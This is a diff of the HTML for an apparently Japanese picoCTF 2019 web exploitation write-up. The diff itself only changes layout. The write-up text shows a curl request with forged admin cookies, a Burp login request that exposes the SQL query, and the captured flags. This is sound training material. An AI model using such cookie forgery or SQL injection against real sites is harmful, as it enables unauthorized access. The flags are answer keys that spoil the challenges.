@@ -35,7 +35,7 @@
 
 
 <link href="https://captureamerica.github.io/writeups/dist/even.c2a46f00.min.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
 
 
 <meta property="og:title" content="picoCTF 2019 Writeup (Web Exploitation)" />
@@ -134,21 +134,27 @@
 
     <div class="post-toc" id="post-toc">
   <h2 class="post-toc-title">Contents</h2>
-  <div class="post-toc-content always-active">
+  <div class="post-toc-content">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#challenge">Challenge</a></li>
-    <li><a href="#solution">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge1">Challenge</a></li>
-    <li><a href="#solution1">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge2">Challenge</a></li>
-    <li><a href="#solution2">Solution</a></li>
+    <li><a href="#web-exploitation-opentoadmins-200-points">[Web Exploitation]: Open-to-admins (200 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-exploitation-irishnamerepo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</a>
+      <ul>
+        <li><a href="#challenge1">Challenge</a></li>
+        <li><a href="#solution1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-exploitation-irishnamerepo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</a>
+      <ul>
+        <li><a href="#challenge2">Challenge</a></li>
+        <li><a href="#solution2">Solution</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -169,30 +175,30 @@
 <p><br /><br />
 Web Exploitation の Writeupです。</p>
 <p><br /><br /></p>
-<h1 id="web-exploitation-opentoadmins-200-points">[Web Exploitation]: Open-to-admins (200 points)</h1>
+<h2 id="web-exploitation-opentoadmins-200-points">[Web Exploitation]: Open-to-admins (200 points)</h2>
 <hr>
-<h2 id="challenge">Challenge</h2>
+<h3 id="challenge">Challenge</h3>
 <blockquote>
 <p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/32249/">https://2019shell1.picoctf.com/problem/32249/</a> (link) or <a href="http://2019shell1.picoctf.com:32249">http://2019shell1.picoctf.com:32249</a>
 <br /><br />
 Hints : Can cookies help you to get the flag?<br /></p>
 </blockquote>
 <p><br /></p>
-<h2 id="solution">Solution</h2>
+<h3 id="solution">Solution</h3>
 <pre><code>curl -k -H 'Cookie: admin=True; time=1400'  https://2019shell1.picoctf.com/problem/32249/flag
 </code></pre><p>Flag: <code>picoCTF{0p3n_t0_adm1n5_cc661e91}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="web-exploitation-irishnamerepo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</h1>
+<h2 id="web-exploitation-irishnamerepo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</h2>
 <hr>
-<h2 id="challenge1">Challenge</h2>
+<h3 id="challenge1">Challenge</h3>
 <blockquote>
 <p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/60775/">https://2019shell1.picoctf.com/problem/60775/</a> (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:60775">http://2019shell1.picoctf.com:60775</a>
 <br /><br />
 Hints : The password is being filtered.</p>
 </blockquote>
 <p><br /></p>
-<h2 id="solution1">Solution</h2>
+<h3 id="solution1">Solution</h3>
 <p>picoCTF 2018のVaultと同じ問題です。</p>
 <p>デバッグを見ようとして、以下を入れたら、Flag取れちゃった。</p>
 <pre><code>username
@@ -203,16 +209,16 @@ password
 </code></pre><p>Flag: <code>picoCTF{m0R3_SQL_plz_015815e2}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="web-exploitation-irishnamerepo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</h1>
+<h2 id="web-exploitation-irishnamerepo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</h2>
 <hr>
-<h2 id="challenge2">Challenge</h2>
+<h3 id="challenge2">Challenge</h3>
 <blockquote>
 <p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/12271/">https://2019shell1.picoctf.com/problem/12271/</a> (link) or <a href="http://2019shell1.picoctf.com:12271">http://2019shell1.picoctf.com:12271</a>. Try to see if you can login as admin!
 <br /><br />
 Hints : Seems like the password is encrypted.</p>
 </blockquote>
 <p><br /></p>
-<h2 id="solution2">Solution</h2>
+<h3 id="solution2">Solution</h3>
 <p>Burpでやったらdebug変数が見えたので、1に変えてみました。</p>
 <pre><code>POST /problem/12271/login.php HTTP/1.1
 Host: 2019shell1.picoctf.com
@@ -323,7 +329,7 @@ SQL query: SELECT * FROM admin where password = 'nqzva'
   
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+  
 <script type="text/javascript" src="https://captureamerica.github.io/writeups/dist/even.26188efa.min.js"></script>
 
 
